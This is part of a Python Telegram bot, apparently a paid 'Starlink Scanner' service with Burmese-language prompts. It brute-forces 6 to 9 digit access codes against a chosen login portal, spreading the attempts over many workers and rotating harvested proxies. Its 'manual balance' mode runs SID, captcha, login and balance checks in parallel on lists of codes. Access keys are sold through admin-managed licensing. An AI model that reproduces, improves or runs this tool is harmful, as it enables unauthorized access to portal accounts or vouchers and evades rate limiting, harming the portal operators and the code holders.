                num = int(val)
            except ValueError:
                num = NUM_WORKERS
            num = max(MIN_WORKERS, min(MAX_WORKERS, num))
            ud["num_workers"] = num

            pm = get_proxy_manager()
            total_p, active_p = pm.stats()
            await query.message.edit_text(
                f"✅ Workers = `{num}`\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{active_p}/{total_p}`\n"
                f"⚙️ Workers: `{num}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
            return

        if data == "btn_start_scanner":
            if not ud["portal_url"]:
                await query.message.edit_text("❌ Portal URL missing")
                return
            if ud["task"] and not ud["task"].done():
                ud["stop_event"].set()
                ud["dash_update_event"].set()
                ud["task"].cancel()
                try:
                    await asyncio.wait_for(ud["task"], timeout=3.0)
                except Exception:
                    pass
            ud["stop_event"].clear()
            ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()}
            ud["valid_codes"] = []
            ud["limit_codes"] = []
            ud["tried_codes"] = set()
            ud["recent_logs"] = []
            ud["CURRENT_CODE"] = "----"
            ud["balance_queue"] = asyncio.Queue()
            await query.message.edit_text("🔄 Initializing scanner dashboard...")
            ud["dash_msg_id"] = query.message.message_id
            ud["scanner_task"] = asyncio.create_task(run_user_scanner(context, user_id))
            return

        if data == "proxy_check_stop":
            pc = user_proxy_checks.get(user_id)
            if pc and pc.get("stop_event"):
                pc["stop_event"].set()
            try:
                await query.answer("🛑 Stopping...", show_alert=False)
            except Exception:
                pass
            return

        # ── PROXY CHECKER MENUS ──
        if data == "btn_proxy_checker":
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🔍 Auto Check (from sources)", callback_data="proxy_check_auto")],
                [InlineKeyboardButton(text="🔗 Check Manual URL", callback_data="proxy_check_manual_url")],
                [InlineKeyboardButton(text="🗑 Clear proxies.txt", callback_data="proxy_clear_file")],
                [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
            ])
            await query.message.edit_text(
                "🔍 **Proxy Checker**\n\n"
                "Auto Check: ရင်းမြစ်များမှ proxy များကို စစ်ဆေးပြီး proxies.txt ထဲ auto ထည့်ပေးမည်\n"
                "Manual URL: URL တစ်ခုမှ proxy များကို စစ်ဆေးမည်\n"
                "Clear: proxies.txt ကို အကုန်ဖျက်မည်",
                reply_markup=keyboard
            )
            return

        if data == "proxy_check_auto":
            pc = user_proxy_checks.get(user_id)
            if pc and pc.get('task') and not pc['task'].done():
                await query.message.edit_text("⚠️ Proxy check ပြေးနေပြီးသားဖြစ်ပါသည်။")
                return
            await query.message.edit_text("⏳ Starting proxy check...")
            asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))
            return

        if data == "proxy_check_manual_url":
            ud['state'] = 'waiting_for_proxy_url'
            ud['menu_msg_id'] = query.message.message_id
            await query.message.edit_text("🔗 **Proxy URL ကို ပို့ပေးပါ**\nဥပမာ - https://example.com/proxies.txt")
            return

        if data == "proxy_clear_file":
            pm = get_proxy_manager()
            pm.clear_file()
            await query.message.edit_text(
                "🗑 **proxies.txt ကို အကုန်ဖျက်ပြီးပါပြီ။**\n\n"
                f"🔀 Proxies: `0/0`",
                reply_markup=get_main_menu_markup(is_admin(user_id))
            )
            return

        # ── MANUAL BALANCE MENUS ──
        if data == "btn_manual_balance":
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="Number 6", callback_data="mb_mode_num6"),
                 InlineKeyboardButton(text="Number 7", callback_data="mb_mode_num7"),
                 InlineKeyboardButton(text="Number 8", callback_data="mb_mode_num8"),
                 InlineKeyboardButton(text="Number 9", callback_data="mb_mode_num9")],
                [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
            ])
            await query.message.edit_text(
                "💳 **Manual Balance Checker (FAST)**\n\n"
                "ပထမဆုံး code mode ကို ရွေးပါ:\n\n"
                "**Mode ရွေးပြီးရင်:**\n"
                "• Code list ကို အကုန်ကူးထည့်ပါ\n"
                "• Auto split + auto filter\n"
                "• SID → captcha → login → balance\n"
                "• Parallel processing (fast)",
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )
            return

        if data.startswith("mb_mode_"):
            mode = data.split("mb_mode_")[1]
            st = get_manual_balance_state(user_id)
            if mode == "num6":
                st['mode'] = "num6"; st['code_len'] = 6
            elif mode == "num7":
                st['mode'] = "num7"; st['code_len'] = 7
            elif mode == "num8":
                st['mode'] = "num8"; st['code_len'] = 8
            elif mode == "num9":
                st['mode'] = "num9"; st['code_len'] = 9
            st['state'] = 'waiting_for_codes'
            st['codes'] = []
            st['results'] = []
            ud['state'] = 'waiting_for_manual_codes'
            await query.message.edit_text(
                f"💳 **Manual Balance — Mode `{st['mode']}`** (FAST)\n\n"
                f"📥 Code များကို ယခုပို့ပါ\n\n"
                f"**Auto filter:** {st['code_len']}-digit code ကိုပဲ စစ်ပါမည်\n"
                f"**Auto split:** Space, Newline, Comma, Semicolon, Pipe\n"
                f"**Parallel:** {MANUAL_CONCURRENCY} codes at once\n\n"
                f"ဥပမာ:\n"
                f"`740264 551342 127115`\n\n"
                f"ရပြီးရင် auto စစ်ပြီး `.txt` ပြန်ပို့ပါမည်။",
                parse_mode=ParseMode.MARKDOWN
            )
            return

    except Exception as e:
        print(f"[CB ERR] {type(e).__name__}: {e}")


# ═══════════════════════════════════════════════════════════════
#  📢 BROADCAST
# ═══════════════════════════════════════════════════════════════
def get_broadcast_confirm_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅  SEND NOW", callback_data="admin_broadcast_send"),
         InlineKeyboardButton("❌  CANCEL", callback_data="admin_broadcast_cancel")],
    ])


async def broadcast_text_handler(update, context):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    if not context.user_data.get("awaiting_broadcast"):
        return

    message_text = update.message.text.strip()

    if not message_text:
        await update.message.reply_text(
            "❌ Message ဗလာဖြစ်နေပါသည်။",
            reply_markup=get_admin_panel_markup())
        context.user_data["awaiting_broadcast"] = False
        return

    if len(message_text) > 4000:
        await update.message.reply_text(
            "❌ Message ရှည်လွန်းပါသည် (max 4000 chars)။",
            reply_markup=get_admin_panel_markup())
        context.user_data["awaiting_broadcast"] = False
        return

    context.user_data["awaiting_broadcast"] = False
    context.user_data["broadcast_preview"] = message_text

    bot_users = load_bot_users()
    total = len(bot_users)

    preview_text = (
        f"📢 <b>BROADCAST PREVIEW</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Recipients: <b>{total}</b> users\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📝 <b>Message:</b>\n\n"
        f"{message_text}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ ဒီ Message ကို User {total} ယောက်ဆီ ပို့မှာ သေချာပါသလား?"
    )

    await update.message.reply_text(
        preview_text,
        parse_mode=ParseMode.HTML,
        reply_markup=get_broadcast_confirm_markup())


async def broadcast_message_from_query(query, context, message_text):
    bot_users = load_bot_users()
    user_ids = list(bot_users.keys())

    if not user_ids:
        try:
            await query.edit_message_text(
                "⚠️ User မရှိသေးပါ။",
                reply_markup=get_admin_panel_markup())
        except Exception:
            pass
        return

    total = len(user_ids)
    sent = 0
    failed = 0
    blocked = 0

    for i, uid in enumerate(user_ids, 1):
        try:
            target_id = int(uid)
            await context.bot.send_message(
                chat_id=target_id,
                text=message_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False)
            sent += 1
        except Exception as e:
            err_str = str(e).lower()
            if "blocked" in err_str or "forbidden" in err_str:
                blocked += 1
            else:
                failed += 1

        if i % 10 == 0 or i == total:
            try:
                await query.edit_message_text(
                    f"📢 <b>Broadcasting...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📤 Sent: <b>{sent}</b> / {total}\n"
                    f"❌ Failed: <b>{failed}</b>\n"
                    f"🚫 Blocked: <b>{blocked}</b>\n"
                    f"📊 Progress: <b>{(i/total)*100:.1f}%</b>",
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass

        await asyncio.sleep(0.05)

    final_text = (
        f"✅ <b>BROADCAST COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📤 Sent: <b>{sent}</b> / {total}\n"
        f"❌ Failed: <b>{failed}</b>\n"
        f"🚫 Blocked: <b>{blocked}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🕐 {now_mm().strftime('%Y-%m-%d %I:%M %p')}"
    )
    try:
        await query.edit_message_text(
            final_text,
            parse_mode=ParseMode.HTML,
            reply_markup=get_admin_panel_markup())
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
#  📞 TEXT HANDLER
# ═══════════════════════════════════════════════════════════════
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get("state")
    text = update.message.text.strip()

    try:
        track_bot_user(update.effective_user)
    except Exception:
        pass

    try:
        if context.user_data.get("awaiting_broadcast"):
            await broadcast_text_handler(update, context)
            return

        if context.user_data.get("waiting_for_key"):
            context.user_data["waiting_for_key"] = False
            key = text.upper().strip()
            if not re.match(r"^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$", key):
                await update.message.reply_text(
                    "❌ Invalid Format",
                    reply_markup=get_access_required_markup())
                return
            keys = load_keys()
            if key not in keys:
                await update.message.reply_text(
                    "❌ Invalid Key",
                    reply_markup=get_access_required_markup())
                return
            info = keys[key]
            if info.get("used_by") and int(info["used_by"]) != user_id:
                await update.message.reply_text(
                    f"⚠️ Used by: <code>{info['used_by']}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_access_required_markup())
                return
            target_uid = info.get("user_id")
            if target_uid and int(target_uid) != user_id and not is_admin(user_id):
                await update.message.reply_text(
                    f"⚠️ For user: <code>{target_uid}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_access_required_markup())
                return
            sec = int(info.get("duration_sec", 0))
            users = load_users()
            if sec == 0:
                users[str(user_id)] = {"expires_at": 0, "via_key": key}
                label = "♾ Unlimited"
                expiry_str = "♾"
                exp_ts = 0
            else:
                exp_ts = int(time.time()) + sec
                users[str(user_id)] = {"expires_at": exp_ts, "via_key": key}
                label = info.get("label", "?")
                expiry_str = format_expiry_mm(exp_ts)
            save_users(users)
            keys[key]["used_by"] = user_id
            keys[key]["used_at"] = time.time()
            keys[key]["activated_expires_at"] = exp_ts
            save_keys(keys)
            await update.message.reply_text(
                f"🎊 <b>ACCESS GRANTED</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔑 Key: <code>{key}</code>\n"
                f"⏱ {label}\n"
                f"⌛ {expiry_str}\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_main_menu_markup(is_admin(user_id)))
            return

        admin_waiting = context.user_data.get("admin_waiting")
        if admin_waiting and is_admin(user_id):
            if admin_waiting == "gen_key_user":
                if not text.isdigit():
                    await update.message.reply_text("❌ Digits only")
                    return
                target_uid = int(text)
                dur_info = context.user_data.get("admin_gen_duration") or {"sec": 3600, "label": "1 Hour"}
                sec = dur_info["sec"]
                label = dur_info["label"]
                keys = load_keys()
                new_key = generate_unique_key(keys)
                keys[new_key] = {
                    "duration_sec": sec, "label": label,
                    "user_id": target_uid, "created_by": user_id,
                    "created_at": time.time(), "used_by": None,
                    "activated_expires_at": 0,
                }
                save_keys(keys)
                expiry_ts = int(time.time()) + sec if sec > 0 else 0
                expiry_str = format_expiry_mm(expiry_ts)
                context.user_data["admin_waiting"] = None
                context.user_data.pop("admin_gen_duration", None)
                await update.message.reply_text(
                    f"✅ <b>KEY GENERATED</b>\n"
                    f"👤 <code>{target_uid}</code>\n"
                    f"⏱ {label}\n"
                    f"🔑 <code>{new_key}</code>\n"
                    f"⌛ {expiry_str}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔑 Another", callback_data="admin_gen_key"),
                         InlineKeyboardButton("🔙 Admin", callback_data="admin_panel")],
                    ]))
                return
            if admin_waiting == "del_key_input":
                target = text.strip()
                keys = load_keys()
                deleted_key = None
                target_user_id = None

                if target in keys:
                    deleted_key = target
                    target_user_id = str(keys[target].get("user_id"))
                    del keys[target]
                    save_keys(keys)
                else:
                    for k, v in list(keys.items()):
                        if str(v.get("user_id", "")) == target.replace(" ", ""):
                            deleted_key = k
                            target_user_id = str(v.get("user_id"))
                            del keys[k]
                    if deleted_key:
                        save_keys(keys)

                # ★ Key ဖျက်လိုက်ရင် အဲဒီ Key နဲ့ ဝင်ထားတဲ့ User ကိုပါ ဖျက်မယ် ★
                uids_to_delete = []
                if deleted_key:
                    users = load_users()
                    # User ကို ရှာပြီး ဖျက်မယ်
                    for uid, uinfo in users.items():
                        if uinfo.get("via_key") == deleted_key or uid == target_user_id:
                            uids_to_delete.append(uid)
                    for uid in uids_to_delete:
                        del users[uid]
                    if uids_to_delete:
                        save_users(users)

                context.user_data["admin_waiting"] = None
                await update.message.reply_text(
                    f"✅ Deleted Key: {deleted_key}\n🗑️ User(s) Removed: {len(uids_to_delete) if deleted_key else 0}" if deleted_key else "❌ Not found")
                return
            if admin_waiting == "set_user_key_input":
                key = text.strip().upper()
                keys = load_keys()
                if key not in keys:
                    await update.message.reply_text("❌ Not found")
                    return
                context.user_data["extend_key"] = key
                context.user_data["admin_waiting"] = None
                await update.message.reply_text(
                    f"🔑 <code>{key}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_extend_duration_markup())
                return
            if admin_waiting == "set_unlimited":
                try:
                    target_id = int(text.strip())
                    users = load_users()
                    users[str(target_id)] = {"expires_at": 0, "set_by": user_id, "set_at": time.time()}
                    save_users(users)
                    context.user_data["admin_waiting"] = None
                    await update.message.reply_text(
                        f"✅ <code>{target_id}</code> → ♾ Unlimited",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    await update.message.reply_text("❌ Invalid")
                return

        if not is_admin(user_id):
            access_ok, access_msg = check_user_access(user_id)
            if not access_ok:
                await update.message.reply_text(
                    f"🔐 <b>ACCESS REQUIRED</b>\n"
                    f"👤 <code>{user_id}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_access_required_markup())
                return

        if state == "waiting_for_portal_url":
            if not text.startswith("http"):
                await update.message.reply_text("❌ Invalid URL")
                return
            ud["portal_url"] = text
            ud["state"] = None
            try:
                with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                    f.write(text)
            except Exception:
                pass

            # ★ Proxy အရေအတွက် ဆွဲထုတ်ခြင်း ★
            pm = get_proxy_manager()
            total_p, active_p = pm.stats()

            msg = await update.message.reply_text(
                f"✅ PORTAL SAVED\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{active_p}/{total_p}`\n"
                f"⚙️ Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
            ud["menu_msg_id"] = msg.message_id
            return

        if state == "admin_waiting_proxy_text" and is_admin(user_id):
            lines = [line.strip() for line in text.splitlines() if line.strip()]
            if not lines:
                await update.message.reply_text("❌ Empty")
                return
            pm = get_proxy_manager()
            added = pm.add_proxies(lines)
            total, active = pm.stats()
            ud["state"] = None
            await update.message.reply_text(
                f"✅ <b>PROXIES SAVED</b>\n"
                f"{DIV}\n"
                f"➕ Added: {added}\n"
                f"📊 Total: {total}\n"
                f"✅ Active: {active}\n"
                f"📌 Admin — Proxies Added",
                parse_mode=ParseMode.HTML,
                reply_markup=get_admin_panel_markup())
            return

        if state == "admin_waiting_proxy_url" and is_admin(user_id):
            if not text.startswith("http"):
                await update.message.reply_text("❌ Invalid URL")
                return
            ud["state"] = None
            await update.message.reply_text(
                f"⏳ Admin — Checking...",
                parse_mode=ParseMode.HTML)
            asyncio.create_task(run_proxy_check(context, update.message.chat_id, user_id, sources=[text]))
            return

        if state == "waiting_for_digit":
            if text in ud["char_set"] and len(text) == 1:
                ud["start_digit"] = text
            else:
                ud["start_digit"] = "0"
            ud["state"] = None
            msg = await update.message.reply_text(
                f"✅ Start Digit = {ud['start_digit']}\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"⚙️ Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(is_admin(user_id)),
                parse_mode=ParseMode.MARKDOWN)
            ud["menu_msg_id"] = msg.message_id
            return

        if state == "waiting_for_workers":
            try:
                n = int(text)
                n = max(MIN_WORKERS, min(MAX_WORKERS, n))
                ud["num_workers"] = n
                ud["state"] = None

                pm = get_proxy_manager()
                total_p, active_p = pm.stats()

                msg = await update.message.reply_text(
                    f"✅ Workers = {n}\n\n"
                    f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                    f"⚙️ Mode: `{ud['mode']}`\n"
                    f"🔀 Proxies: `{active_p}/{total_p}`\n"
                    f"⚙️ Workers: `{n}`",
                    reply_markup=get_main_menu_markup(is_admin(user_id)),
                    parse_mode=ParseMode.MARKDOWN)
                ud["menu_msg_id"] = msg.message_id
            except ValueError:
                await update.message.reply_text(f"❌ Range {MIN_WORKERS}-{MAX_WORKERS}")
            return

        if state == "waiting_for_proxy_url":
            if not text.startswith("http"):
                await update.message.reply_text("❌ Invalid URL")
                return
            ud["state"] = None
            await update.message.reply_text("⏳ Manual URL မှ proxy များကို စစ်ဆေးနေပါသည်...")
            pc = user_proxy_checks.get(user_id)
            if pc and pc.get('task') and not pc['task'].done():
                await update.message.reply_text("⚠️ Proxy check ပြေးနေပြီးသားဖြစ်ပါသည်။")
                return
            asyncio.create_task(run_proxy_check(context, update.message.chat_id, user_id, sources=[text]))
            return

        if state == "waiting_for_manual_codes":
            st = get_manual_balance_state(user_id)
            expected_len = st['code_len']
            codes = split_codes(text, expected_len=expected_len)
            raw_all = split_codes(text, expected_len=None)
            skipped = len(raw_all) - len(codes)
            if not codes:
                await update.message.reply_text(
                    f"❌ Mode `{st['mode']}` ({expected_len} digit) နဲ့ ကိုက်တာ မရှိပါ။\n"
                    f"Raw codes: {len(raw_all)} ခုရှိပေမယ့် length {expected_len} မကိုက်ပါ။",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
            st['codes'] = codes
            ud['state'] = None
            await update.message.reply_text(
                f"✅ Codes လက်ခံပြီးပါပြီ\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚙️ Mode     : `{st['mode']}` ({expected_len} digit)\n"
                f"📋 Valid    : {len(codes)}\n"
                f"⏭ Skipped  : {skipped}\n"
                f"⚡ Parallel : {MANUAL_CONCURRENCY}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Auto check စတင်ပါပြီ (FAST)...",
                parse_mode=ParseMode.MARKDOWN
            )
            st['task'] = asyncio.create_task(
                run_manual_balance_check(context, update.message.chat_id, user_id)
            )
            return

    except Exception as e:
        print(f"[TXT ERR] {type(e).__name__}: {e}")


# ═══════════════════════════════════════════════════════════════
#  🚀 MAIN
# ═══════════════════════════════════════════════════════════════
def ensure_files_exist():
    for fname in (KEYS_FILE, USERS_FILE, BOT_USERS_FILE, ADMIN_IDS_FILE):
        if not os.path.exists(fname):
            try:
                with open(fname, "w") as f:
                    f.write("[]" if fname == ADMIN_IDS_FILE else "{}")
            except OSError:
                pass
pass

def main():
    _apply_replit_limits()
    _tune_gc()

    load_config()
    check_approval()
    start_web()
    ensure_files_exist()
    bot_token = get_token()
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"{CYAN}[MAIN] Proxies: {active}/{total}{RESET}")
    print(f"{MAGENTA}[MAIN] Owner: {OWNER}{RESET}")
    print(f"{MAGENTA}[MAIN] Admins: {load_admin_ids()}{RESET}")
    print(f"{GREEN}[MAIN] Bot Token: {bot_token[:10]}...{RESET}")
    print(f"{YELLOW}[MAIN] 🛡️ Replit Shield ▸ CPU@{CPU_PAUSE_THRESHOLD}% MEM@{MEM_PAUSE_THRESHOLD}% RSS@{RSS_HARD_MB}MB FD@{FD_HARD}{RESET}")

    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("myid", myid_command))
    app.add_handler(CommandHandler("mykey", mykey_command))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("removeadmin", removeadmin_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("clearall", clearall_command))
    app.add_handler(CommandHandler("allhits", allhits_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print(f"{GREEN}[MAIN] Bot running...{RESET}")
    print(f"{YELLOW}{BOT_TAGLINE}{RESET}")
    app.run_polling()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
